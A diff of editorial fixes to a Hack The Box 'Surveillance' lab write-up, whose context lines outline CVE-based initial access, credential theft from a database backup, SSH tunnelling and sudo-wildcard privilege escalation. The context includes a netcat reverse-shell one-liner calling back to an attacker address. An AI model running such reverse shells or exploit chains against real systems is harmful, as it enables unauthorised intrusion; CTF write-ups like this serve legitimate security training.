@@ -14,7 +14,7 @@ categories = ['Writeups']
 * OS: Linux
 ---
 
-Sureveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it. Eventually, by exploiting vulnerabilities in certain scripts, we escalate our privileges and gain access to the root account.
+Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it. Eventually, by exploiting vulnerabilities in certain scripts, we escalate our privileges and gain access to the root account.
 
 Target IP - `10.10.11.245`
 
@@ -88,7 +88,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.4 4444 >/tmp/f
 
 ![Reverse shell transfer](/images/HTB-Surveillance/revshell.png)
 
-We are then able to upgrade the shell we obtain via our listener.
+We then upgrade the shell we obtain via our listener.
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -108,9 +108,9 @@ For the system enumeration, we run `linpeas`. We note that `mysql` is running on
 
 We also find credentials for the MySQL instance. 
 
-> We end up finding a `craftdb` database, with a table named `users` but we cannot crack the hashes found there.
-
 ![MySQL credentials](/images/HTB-Surveillance/Craft-db-pwd.png)
+
+> We end up finding a `craftdb` database, with a table named `users` but we cannot crack the hashes found there.
 
 A backup of the database is also found on the target in `/var/www/html/craft/storage/backups/`.
 
@@ -165,7 +165,7 @@ On our listener we get another shell as `zoneminder`.
 
 ## Privilege Escalation
 
-Running `sudo -l`, we find out that the user `zoneminder` can execute anything matching the pattern `/usr/bin/zm[a-zA-Z]*.pl` with `sudo` privileges without being prompted for a password. Moreover any options can be passed to the commands thanks to the wildcard `*`.
+Running `sudo -l`, we learn that the user `zoneminder` can execute anything matching the pattern `/usr/bin/zm[a-zA-Z]*.pl` with `sudo` privileges without being prompted for a password. Moreover any options can be passed to the commands thanks to the wildcard `*`.
 
 ![sudo -l command](/images/HTB-Surveillance/sudo-l.png)
 
